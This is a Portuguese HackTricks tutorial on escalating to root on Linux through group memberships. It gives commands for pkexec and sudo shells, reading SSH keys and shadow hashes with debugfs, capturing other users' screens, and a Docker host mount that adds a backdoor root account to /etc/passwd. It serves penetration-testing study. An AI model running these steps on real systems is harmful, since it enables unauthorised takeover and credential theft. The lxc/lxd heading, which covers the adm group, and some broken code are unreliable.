# Grupos Interessantes - Linux Privesc

<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>

## Grupos Sudo/Admin

### **PE - Método 1**

**Às vezes**, **por padrão (ou porque algum software precisa)** dentro do arquivo **/etc/sudoers** você pode encontrar algumas dessas linhas:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Isso significa que **qualquer usuário que pertença ao grupo sudo ou admin pode executar qualquer coisa como sudo**.

Se for o caso, para **se tornar root você pode simplesmente executar**:
```
sudo su
```
### PE - Método 2

Encontre todos os binários suid e verifique se há o binário **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Se você descobrir que o binário **pkexec é um binário SUID** e você pertence ao grupo **sudo** ou **admin**, provavelmente poderá executar binários como sudo usando `pkexec`.\
Isso ocorre porque normalmente esses são os grupos dentro da **política polkit**. Essa política basicamente identifica quais grupos podem usar `pkexec`. Verifique com:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Aqui você encontrará quais grupos têm permissão para executar **pkexec** e **por padrão** em algumas distribuições linux os grupos **sudo** e **admin** aparecem.

Para **se tornar root você pode executar**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Se tentar executar **pkexec** e receber este **erro**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Não é porque você não tem permissões, mas sim porque você não está conectado sem uma GUI**. E há uma solução alternativa para esse problema aqui: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Você precisa de **2 sessões ssh diferentes**:

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% endcode %}

{% code title="sessão2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Grupo Wheel

**Às vezes**, **por padrão** dentro do arquivo **/etc/sudoers** você pode encontrar esta linha:
```
%wheel	ALL=(ALL:ALL) ALL
```
Isso significa que **qualquer usuário que pertença ao grupo wheel pode executar qualquer coisa como sudo**.

Se for o caso, para **se tornar root, você pode simplesmente executar**:
```
sudo su
```
## Grupo Shadow

Usuários do **grupo shadow** podem **ler** o arquivo **/etc/shadow**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Então, leia o arquivo e tente **quebrar alguns hashes**.

## Grupo de Disco

Este privilégio é quase **equivalente ao acesso root** pois você pode acessar todos os dados dentro da máquina.

Arquivos: `/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Note que usando o debugfs você também pode **escrever arquivos**. Por exemplo, para copiar `/tmp/asd1.txt` para `/tmp/asd2.txt`, você pode fazer:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
No entanto, se você tentar **escrever arquivos de propriedade do root** (como `/etc/shadow` ou `/etc/passwd`) você receberá um erro de "**Permissão negada**".

## Grupo de Vídeo

Usando o comando `w` você pode encontrar **quem está logado no sistema** e ele mostrará uma saída como a seguinte:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
O **tty1** significa que o usuário **yossi está logado fisicamente** em um terminal na máquina.

O grupo **video** tem acesso para visualizar a saída da tela. Basicamente, você pode observar as telas. Para fazer isso, você precisa **capturar a imagem atual na tela** em dados brutos e obter a resolução que a tela está usando. Os dados da tela podem ser salvos em `/dev/fb0` e você pode encontrar a resolução desta tela em `/sys/class/graphics/fb0/virtual_size`.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Para **abrir** a **imagem bruta**, você pode usar o **GIMP**, selecionar o arquivo \*\*`screen.raw` \*\* e selecionar como tipo de arquivo **Dados de imagem bruta**:

![](<../../../.gitbook/assets/image (287) (1).png>)

Em seguida, modifique a Largura e Altura para as usadas na tela e verifique os diferentes Tipos de Imagem (e selecione aquele que mostra melhor a tela):

![](<../../../.gitbook/assets/image (288).png>)

## Grupo Root

Parece que por padrão, **membros do grupo root** podem ter acesso para **modificar** alguns arquivos de configuração de **serviços** ou alguns arquivos de **bibliotecas** ou **outras coisas interessantes** que poderiam ser usadas para escalar privilégios...

**Verifique quais arquivos os membros do root podem modificar**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Grupo Docker

Você pode **montar o sistema de arquivos raiz da máquina hospedeira em um volume da instância**, para que, quando a instância iniciar, ela carregue imediatamente um `chroot` nesse volume. Isso efetivamente lhe dá acesso root na máquina.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
## Grupo lxc/lxd

Geralmente, **membros** do grupo **`adm`** têm permissão para **ler arquivos de log** localizados dentro de _/var/log/_.\
Portanto, se você comprometeu um usuário dentro deste grupo, definitivamente deve **dar uma olhada nos logs**.

## Grupo Auth

Dentro do OpenBSD, o grupo **auth** geralmente pode escrever nas pastas _**/etc/skey**_ e _**/var/db/yubikey**_ se forem usadas.\
Essas permissões podem ser abusadas com o seguinte exploit para **escalar privilégios** para root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
